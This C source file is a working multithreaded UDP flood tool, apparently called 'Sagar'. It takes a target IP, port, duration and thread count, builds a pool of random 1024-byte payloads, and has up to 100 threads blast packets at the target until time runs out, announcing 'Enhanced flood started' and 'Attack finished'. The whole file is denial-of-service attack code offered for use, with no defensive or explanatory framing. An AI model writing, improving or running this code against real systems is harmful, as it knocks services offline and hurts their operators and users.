#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define PAYLOAD_SIZE 1024       // Size of each payload
#define NUM_PAYLOADS 900        // Number of unique payloads in the pool
#define MAX_THREADS 100         // Maximum allowed threads

// Global payload pool
char payload_pool[NUM_PAYLOADS][PAYLOAD_SIZE];

void usage() {
    printf("Usage: ./Sagar <ip> <port> <duration> <threads>\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int duration; // Duration of the attack in seconds
};

// Function to generate a random payload of a given size
void generate_payload(char *payload, size_t size) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (size_t i = 0; i < size - 1; i++) {
        payload[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    payload[size - 1] = '\0';  // Null-terminate the payload
}

// Attack thread function
void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;
    
    // Create a UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Configure server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);
    
    endtime = time(NULL) + data->duration;
    
    // Send packets until the duration expires
    while (time(NULL) <= endtime) {
        int index = rand() % NUM_PAYLOADS;  // Randomly select a pre-generated payload
        if (sendto(sock, payload_pool[index], PAYLOAD_SIZE, 0,
                   (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
    }
    
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }
    
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    
    if (threads > MAX_THREADS) {
        printf("Error: Maximum threads allowed is %d\n", MAX_THREADS);
        exit(1);
    }
    
    // Seed the random number generator and pre-generate payloads
    srand(time(NULL));
    for (int i = 0; i < NUM_PAYLOADS; i++) {
        generate_payload(payload_pool[i], PAYLOAD_SIZE);
    }
    
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    if (thread_ids == NULL) {
        perror("Memory allocation failed");
        exit(1);
    }
    
    printf("Enhanced flood started on %s:%d for %d seconds with %d threads\n", ip, port, duration, threads);
    
    // Launch threads for the attack
    for (int i = 0; i < threads; i++) {
        struct thread_data *data = malloc(sizeof(struct thread_data));
        if (data == NULL) {
            perror("Memory allocation failed");
            free(thread_ids);
            exit(1);
        }
        data->ip = ip;
        data->port = port;
        data->duration = duration;
        
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)data) != 0) {
            perror("Thread creation failed");
            free(data);
            free(thread_ids);
            exit(1);
        }
        printf("Launched thread with ID: %lu\n", thread_ids[i]);
    }
    
    // Wait for all threads to complete
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }
    
    free(thread_ids);
    printf("Attack finished\n");
    return 0;
}
